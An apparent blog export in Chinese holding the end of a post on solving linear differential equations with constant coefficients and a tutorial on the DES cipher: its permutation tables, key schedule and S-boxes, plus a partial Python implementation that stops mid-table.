<li>若$\varPhi_1(x),\varPhi_2(x)$分别为(1)、(2)的两个解，则$\varPhi_1(x)+\varPhi_2(x)$为(2)的一个解</li>
<li>若$\varPhi_1(x),\varPhi_2(x)$为(2)的两个解，则$\varPhi_1(x)-\varPhi_2(x)$为(1)的解</li>
<li>若$\varPhi_1(x),\varPhi_2(x)$分别为(2.1)及(2.2)的两个解，则$\varPhi_1(x)+\varPhi_2(x)$为(2)的解</li>
<li>若$\varPhi_1(x),\varPhi_2(x),…,\varPhi_s(x)$为(2)的一组解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_s\varPhi_s(x)$为(2)的解的充分必要条件是$k_1+k_2+…+k_s=1$</li>
<li>若$\varPhi_1(x),\varPhi_2(x),…,\varPhi_s(x)$为(2)的一组解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_s\varPhi_s(x)$为(1)的解的充分必要条件是$k_1+k_2+…+k_s=0$</li>
<li>设$\varPhi_1(x),\varPhi_2(x),…,\varPhi_n(x)$为(1)的n个线性无关解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_n\varPhi_n(x)$为(1)的通解</li>
<li>若$\varPhi_1(x),\varPhi_2(x),…,\varPhi_n(x)$为(1)的n个线性无关解，$\varPhi_0(x)$为(2)的一个特解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_n\varPhi_n(x)+\varPhi_0(x)$为(2)的通解</li>
</ol>
<h3 id="二阶常系数齐次线性微分方程及解法"><a href="#二阶常系数齐次线性微分方程及解法" class="headerlink" title="二阶常系数齐次线性微分方程及解法"></a>二阶常系数齐次线性微分方程及解法</h3><div class="table-container">
<table>
<thead>
<tr>
<th>方程形式</th>
<th>$y’’+py’+qy=0$(其中p，q为常数)</th>
</tr>
</thead>
<tbody>
<tr>
<td>特征方程</td>
<td>$\lambda^2+p\lambda+q=0$</td>
</tr>
<tr>
<td>$\Delta=p^2-4q$的情况</td>
<td>$y’’+py’+qy=0$的通解</td>
</tr>
<tr>
<td>$\Delta&gt;0$</td>
<td>$y=C_1e^{\lambda_1x}+C_2^{\lambda_2x}$($C_1,C_2$为任意常数)</td>
</tr>
<tr>
<td>$\Delta=0$</td>
<td>$y=(C_1+C_2x)e^{\lambda_1x}$($C_1,C_2$为任意常数)</td>
</tr>
<tr>
<td>$\Delta&lt;0$</td>
<td>$\lambda_1=\alpha+i\beta,\lambda_2=\alpha-i\beta$ <br> $y=e^{\alpha x}(C_1\cos\beta x+C_2\sin\beta x)$</td>
</tr>
</tbody>
</table>
</div>
<h3 id="三阶常系数齐次线性微分方程及解法"><a href="#三阶常系数齐次线性微分方程及解法" class="headerlink" title="三阶常系数齐次线性微分方程及解法"></a>三阶常系数齐次线性微分方程及解法</h3><p>对$y’’’+py’’+qy’+ry=0$(其中p，q，r为常数)，特征方程为</p>
<script type="math/tex; mode=display">\lambda^3+p\lambda^2+q\lambda+r=0</script><p>(1) 若特征值$\lambda_1,\lambda_2,\lambda_3$为实单根，则通解为$y=C_1e^{\lambda_1x}+C_2^{\lambda_2x}+C_3e^{\lambda_3x}$</p>
<p>(2) 若特征值$\lambda_1=\lambda_2\not=\lambda_3$为实根，则通解为$y=(C_1+C_2x)e^{\lambda_1x}+C_3e^{\lambda_3x}$</p>
<p>(3) 若特征值$\lambda_1=\lambda_2=\lambda_3$为实根，则通解为$y=(C_1+C_2x+C_3x^2)e^{\lambda_1x}$</p>
<p>(4) 若$\lambda_{1,2}=\alpha\pm i\beta,\lambda_3\in R$，则通解为$y=e^{\alpha x}(C_1\cos\beta x+C_2\sin\beta x))+C_3e^{\lambda_3x}$</p>
<h3 id="二阶常系数非齐次线性微分方程的特解求法"><a href="#二阶常系数非齐次线性微分方程的特解求法" class="headerlink" title="二阶常系数非齐次线性微分方程的特解求法"></a>二阶常系数非齐次线性微分方程的特解求法</h3><p>类型一：$f(x)=e^{kx}P_n(x)$，其中$P_n(x)$为n次多项式</p>
<p>(1) 当$k\not ={\lambda_1}$且$k\not ={\lambda_2}$时，令特解$y_0(x)=(a_0+a_1x+…+a_nx^n)e^{kx}=Q(x)e^{kx}$</p>
<p>(2) 当$k={\lambda_1}$且$k\not ={\lambda_2}$时，令特解$y_0(x)=x(a_0+a_1x+…+a_nx^n)e^{kx}=xQ(x)e^{kx}$</p>
<p>(3) 当$k={\lambda_1}={\lambda_2}$时，令特解$y_0(x)=x^2(a_0+a_1x+…+a_nx^n)e^{kx}=x^2Q(x)e^{kx}$</p>
<p>类型二：$f(x)=e^{\alpha x}[P_m(x)cos\beta x+P_s(x)sin\beta x]$，其中$P_m,P_s(x)$分别为m及s次多项式</p>
<p>(1) 当$\alpha+i\beta$不是特征值时，令$y_0=e^{\alpha x}[Q_n^{(1)}(x)cos\beta x+Q_n^{2}(x)sin\beta x$，其中n=max{m,s}，且$Q_n^{1}(x),Q_n^{2}(x)$为两个n次多项式</p>
<p>(2) 当$\alpha+i\beta$是特征值时，令$y_0=xe^{\alpha x}[Q_n^{(1)}(x)cos\beta x+Q_n^{2}(x)sin\beta x$，其中n=max{m,s}，且$Q_n^{1}(x),Q_n^{2}(x)$为两个n次多项式</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>高等数学</tag>
      </tags>
  </entry>
  <entry>
    <title>DES算法</title>
    <url>/2020/03/13/DES%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="本文为DES算法的原理详解"><a href="#本文为DES算法的原理详解" class="headerlink" title="本文为DES算法的原理详解"></a>本文为DES算法的原理详解</h2><span id="more"></span>
<h2 id="DES算法详解"><a href="#DES算法详解" class="headerlink" title="DES算法详解"></a>DES算法详解</h2><h3 id="算法简介"><a href="#算法简介" class="headerlink" title="算法简介"></a>算法简介</h3><p>DES是一个分组加密算法，典型的DES以64位为分组数据加密，加密和解密用的是同一算法。<br>它的密钥长度是56比特。尽管从规格上来说，DES的密钥长度是64比特，但由于每个7比特会设置一个用于错误检验的比特，因此实质上其密钥长度是56比特。<br>加密算法流程：<br><img src="/2020/03/13/DES%E7%AE%97%E6%B3%95/01.png" alt="9090bbfe6a422c74e42749050102f862.png"></p>
<h3 id="明文初始置换（IP初始置换）"><a href="#明文初始置换（IP初始置换）" class="headerlink" title="明文初始置换（IP初始置换）"></a>明文初始置换（IP初始置换）</h3><p>IP置换目的是将输入的64位明文数据块按位重新组合，并把输出分为L0，R0两部分，每部分各长32位。<br><strong>注意：这里的数字表示的是原数据的位置，不是数据</strong></p>
<p>置换规则如下表：</p>
<blockquote>
<p>58,50,42,34,26,18,10,2,<br>60,52,44,36,28,20,12,4,<br>62,54,46,38,30,22,14,6,<br>64,56,48,40,32,24,16,8,<br>57,49,41,33,25,17, 9,1,<br>59,51,43,35,27,19,11,3,<br>61,53,45,37,29,21,13,5,<br>63,55,47,39,31,23,15,7,</p>
</blockquote>
<p>即将第58位明文换到第一个位置，第50位明文换到第2位。以此类推。<br>L0:</p>
<blockquote>
<p>58,50,42,34,26,18,10,2,<br>60,52,44,36,28,20,12,4,<br>62,54,46,38,30,22,14,6,<br>64,56,48,40,32,24,16,8,</p>
</blockquote>
<p>R0:</p>
<blockquote>
<p>57,49,41,33,25,17, 9,1,<br>59,51,43,35,27,19,11,3,<br>61,53,45,37,29,21,13,5,<br>63,55,47,39,31,23,15,7,</p>
</blockquote>
<p>然后分为左右两部分</p>
<h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><h4 id="密钥初始置换（密钥由64位转为56位）"><a href="#密钥初始置换（密钥由64位转为56位）" class="headerlink" title="密钥初始置换（密钥由64位转为56位）"></a>密钥初始置换（密钥由64位转为56位）</h4><p><strong>操作对象是64位秘钥</strong></p>
<p>不考虑每个字节的第8位，DES的密钥由64位减至56位，每个字节的第8位作为奇偶校验位。产生的56位密钥由下表生成（注意表中没有8，16，24，32，40，48，56和64这8位）：<br><strong>注意：这里的数字表示的是原数据的位置，不是数据</strong><br>C0:</p>
<blockquote>
<p>57,49,41,33,25,17,9<br>1,58,50,42,34,26,18<br>10,2,59,51,43,35,27<br>19,11,3,60,52,44,36</p>
</blockquote>
<p>D0:</p>
<blockquote>
<p>63,55,47,39,31,23,15<br>7,62,54,46,38,30,22<br>14,6,61,53,45,37,29<br>21,13,5,28,20,12,4</p>
</blockquote>
<h4 id="生成16个48位的子密钥"><a href="#生成16个48位的子密钥" class="headerlink" title="生成16个48位的子密钥"></a>生成16个48位的子密钥</h4><p>在DES的每一轮中，从56位密钥产生出不同的48子密钥，确定这些子密钥的方式如下：<br>1）将56位密钥分成两部分，每部分28位。<br>2）根据轮数，这两部分分别循环左移1位或2位。每轮移动的位数如下表：<br><img src="/2020/03/13/DES%E7%AE%97%E6%B3%95/02.png" alt="15b5906b4985620fae91c07441373fd3.png"></p>
<h5 id="第一轮循环左移1位"><a href="#第一轮循环左移1位" class="headerlink" title="第一轮循环左移1位"></a>第一轮循环左移1位</h5><p>C1:</p>
<blockquote>
<p>49,41,33,25,17,9,1<br>58,50,42,34,26,18,10<br>2,59,51,43,35,27,19<br>11,3,60,52,44,36,57</p>
</blockquote>
<p>D1:</p>
<blockquote>
<p>55,47,39,31,23,15,7,<br>62,54,46,38,30,22,14,<br>6,61,53,45,37,29,21,<br>13,5,28,20,12,4,63</p>
</blockquote>
<p>C1和D1合并之后，再经过置换表2生成48位的子密钥k1。<strong>56位转48位</strong><br><strong>置换表2</strong></p>
<blockquote>
<p>14,17,11,24,1,5<br>3,28,15,6,21,10<br>23,19,12,4,26,8<br>16,7,27,20,13,2<br>41,52,31,37,47,55<br>30,40,51,45,33,48<br>44.,49,39,56,34,53<br>46,42,50,36,29,32</p>
</blockquote>
<p>C1和D1再次经过循环左移变换，生成C2和D2，C2和D2合并，通过置换表2生成子秘钥K2。<br>以此类推，得到子秘钥K1~K16。需要注意其中循环左移的位数。</p>
<h3 id="16轮迭代（F函数）"><a href="#16轮迭代（F函数）" class="headerlink" title="16轮迭代（F函数）"></a>16轮迭代（F函数）</h3><h4 id="明文扩展置换（E盒扩展32位转48位）"><a href="#明文扩展置换（E盒扩展32位转48位）" class="headerlink" title="明文扩展置换（E盒扩展32位转48位）"></a>明文扩展置换（E盒扩展32位转48位）</h4><p>输入初始置换后明文右侧32位，最后变为48位。<br><img src="/2020/03/13/DES%E7%AE%97%E6%B3%95/03.png" alt="ca8801b6152ca8f712914df35f077989.png"><br>扩展规则如下：<br><img src="/2020/03/13/DES%E7%AE%97%E6%B3%95/04.png" alt="39726d21a7ff43ec18c06d4d8f3c2bd7.png"></p>
<blockquote>
<p>32,1,2,3,4,5,<br>4,5,6,7,8,9,<br>8,9,10,11,12,13,<br>12,13,14,15,16,17,<br>16,17,18,19,20,21,<br>20,21,22,23,24,25,<br>24,25,26,27,28,29,<br>28,29,30,31,32,1</p>
</blockquote>
<h4 id="S盒替代"><a href="#S盒替代" class="headerlink" title="S盒替代"></a>S盒替代</h4><p>   压缩后的密钥与扩展分组异或以后得到48位的数据，将这个数据送入S盒，进行替代运算。替代由8个不同的S盒完成，每个S盒有6位输入4位输出。48位输入分为8个6位的分组，一个分组对应一个S盒，对应的S盒对各组进行代替操作。<br><img src="/2020/03/13/DES%E7%AE%97%E6%B3%95/05.png" alt="130b775c24f796bf9a930d813808389b.png"><br><img src="/2020/03/13/DES%E7%AE%97%E6%B3%95/06.png" alt="734d32e5dad6ee761f501b0703cc5e6d.png"></p>
<p>   一个S盒就是一个4行16列的表，盒中的每一项都是一个4位的数。S盒的6个输入确定了其对应的输出在哪一行哪一列，输入的<strong>高低两位做为行数H</strong>，<strong>中间四位做为列数L</strong>，在S-BOX中查找第H行L列对应的数据(&lt;32)。</p>
<h5 id="8个S盒"><a href="#8个S盒" class="headerlink" title="8个S盒"></a>8个S盒</h5><p><strong>S盒1：</strong></p>
<blockquote>
<p>14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,<br>0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,<br>4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,<br>15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13,</p>
</blockquote>
<p><strong>S盒2：</strong></p>
<blockquote>
<p>15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,<br>3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,<br>0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,<br>13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9,</p>
</blockquote>
<p><strong>S盒3：</strong></p>
<blockquote>
<p>10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,<br>13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,<br>13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,<br>1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12,</p>
</blockquote>
<p><strong>S盒4：</strong></p>
<blockquote>
<p>7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,<br>13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,<br>10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,<br>3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14,</p>
</blockquote>
<p><strong>S盒5：</strong></p>
<blockquote>
<p>2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,<br>14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,<br>4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,<br>11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3,</p>
</blockquote>
<p><strong>S盒6：</strong></p>
<blockquote>
<p>12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,<br>10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,<br>9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,<br>4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13,</p>
</blockquote>
<p><strong>S盒7：</strong></p>
<blockquote>
<p>4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,<br>13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,<br>1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,<br>6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12,</p>
</blockquote>
<p><strong>S盒8：</strong></p>
<blockquote>
<p>13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,<br>1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,<br>7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,<br>2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11,</p>
</blockquote>
<p><img src="/2020/03/13/DES%E7%AE%97%E6%B3%95/07.png" alt="5c79891ddb9cda188777b0475500e3ab.png"></p>
<p>例如，假设S盒8的输入为110011，第1位和第6位组合为11，对应于S盒8的第3行；第2位到第5位为1001，对应于S盒8的第9列。S盒8的第3行第9列的数字为12，因此用1100来代替110011。注意，S盒的行列计数都是从0开始。</p>
<p>代替过程产生8个4位的分组，组合在一起形成32位数据。</p>
<p>S盒代替是DES算法的关键步骤，所有的其他的运算都是线性的，易于分析，而S盒是非线性的，相比于其他步骤，提供了更好安全性。</p>
<h4 id="P盒置换"><a href="#P盒置换" class="headerlink" title="P盒置换"></a>P盒置换</h4><p>S盒代替运算的32位输出按照P盒进行置换。该置换把输入的每位映射到输出位，任何一位不能被映射两次，也不能被略去，映射规则如下表：</p>
<blockquote>
<p>16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,<br>2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25,</p>
</blockquote>
<p>表中的数字代表原数据中此位置的数据在新数据中的位置，即原数据块的第16位放到新数据的第1位，第7位放到第2位，……依此类推，第25位放到第32位。</p>
<p>最后，P盒置换的结果与最初的64位分组左半部分L0异或，然后左、右半部分交换，接着开始另一轮</p>
<h3 id="末置换"><a href="#末置换" class="headerlink" title="末置换"></a>末置换</h3><p>末置换是初始置换的逆过程，DES最后一轮后，左、右两半部分并未进行交换，而是两部分合并形成一个分组做为末置换的输入。末置换规则如下：</p>
<blockquote>
<p>40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,<br>38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,<br>36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,<br>34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25,</p>
</blockquote>
<h3 id="DES的解密"><a href="#DES的解密" class="headerlink" title="DES的解密"></a>DES的解密</h3><p>加密和解密可以使用相同的算法。加密和解密唯一不同的是秘钥的次序是相反的。就是说如果每一轮的加密秘钥分别是K1、K2、K3…K16，那么解密秘钥就是K16、K15、K14…K1。</p>
<h2 id="代码实现（python）"><a href="#代码实现（python）" class="headerlink" title="代码实现（python）"></a>代码实现（python）</h2><h3 id="密钥生成部分"><a href="#密钥生成部分" class="headerlink" title="密钥生成部分"></a>密钥生成部分</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">MaxTime = <span class="number">16</span></span><br><span class="line"><span class="comment"># 密钥初始置换 64位密钥转换为56位</span></span><br><span class="line">key_table1 = [<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,</span><br><span class="line">              <span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,</span><br><span class="line">              <span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,</span><br><span class="line">              <span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,</span><br><span class="line">              <span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,</span><br><span class="line">              <span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,</span><br><span class="line">              <span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,</span><br><span class="line">              <span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>]</span><br><span class="line"><span class="comment"># 密钥置换表2 56位转48位</span></span><br><span class="line">key_table2 = [<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,</span><br><span class="line">              <span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,</span><br><span class="line">              <span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,</span><br><span class="line">              <span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,</span><br><span class="line">              <span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,</span><br><span class="line">              <span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,</span><br><span class="line">              <span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,</span><br><span class="line">              <span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ListMove</span>(<span class="params">l,step</span>):</span> <span class="comment">#将列表中的元素循环左移</span></span><br><span class="line">    <span class="keyword">return</span> l[step:] + l[:step]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubKey</span>(<span class="params">key</span>):</span> <span class="comment">#生成子密钥</span></span><br><span class="line">    keyresult = []</span><br><span class="line">    key0 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key_table1)):  <span class="comment">#密钥初始置换 64位转56位</span></span><br><span class="line">        key0[i] = key[key_table1[i]-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 生成16个密钥</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(MaxTime):</span><br><span class="line">        key1 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">        <span class="comment"># 每次位移次数</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">1</span> <span class="keyword">or</span> i == <span class="number">8</span> <span class="keyword">or</span> i == <span class="number">15</span>:</span><br><span class="line">            step = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            step = <span class="number">2</span></span><br><span class="line">        <span class="comment"># 分成左右两部分</span></span><br><span class="line">        temp1 = key0[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">        temp2 = key0[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">        <span class="comment"># 循环左移</span></span><br><span class="line">        temp1 = ListMove(temp1,step)</span><br><span class="line">        temp2 = ListMove(temp2,step)</span><br><span class="line">        <span class="comment"># 左右连接</span></span><br><span class="line">        key0 = temp1 + temp2</span><br><span class="line">        <span class="comment"># 置换 56位转48位</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key_table2)):</span><br><span class="line">            key1[i] = key0[key_table2[i]-<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 生成密钥</span></span><br><span class="line">        keyresult.append(key1)</span><br><span class="line">    <span class="comment"># 返回每次的密钥</span></span><br><span class="line">    <span class="keyword">return</span> keyresult</span><br></pre></td></tr></table></figure>
<h3 id="F函数"><a href="#F函数" class="headerlink" title="F函数"></a>F函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">MaxTime = <span class="number">16</span></span><br><span class="line"><span class="comment"># 初始IP置换表</span></span><br><span class="line">IP_table = [<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,</span><br><span class="line">            <span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,</span><br><span class="line">            <span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,</span><br><span class="line">            <span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,</span><br><span class="line">            <span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>, <span class="number">9</span>,<span class="number">1</span>,</span><br><span class="line">            <span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,</span><br><span class="line">            <span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,</span><br><span class="line">            <span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line"><span class="comment"># 逆IP置换表</span></span><br><span class="line">Inv_IP_table = [<span class="number">40</span>,  <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">                <span class="number">39</span>,  <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                <span class="number">38</span>,  <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">                <span class="number">37</span>,  <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">36</span>,  <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">                <span class="number">35</span>,  <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                <span class="number">34</span>,  <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">                <span class="number">33</span>,  <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"><span class="comment"># E盒表</span></span><br><span class="line">extend_table = [<span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line">                <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line">                <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">                <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">                <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">                <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">                <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span>]</span><br><span class="line"><span class="comment"># S1盒</span></span><br><span class="line">S1 = [<span class="number">14</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">8</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">7</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">15</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">      <span class="number">4</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">5</span>,  <span class="number">0</span>,</span><br><span class="line">      <span class="number">15</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line"><span class="comment"># S2盒</span></span><br><span class="line">S2 = [<span class="number">15</span>,  <span class="number">1</span>,  <span class="number">8</span>, <span class="number">14</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">13</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">15</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">11</span>,  <span class="number">5</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">14</span>,  <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">4</span>, <span 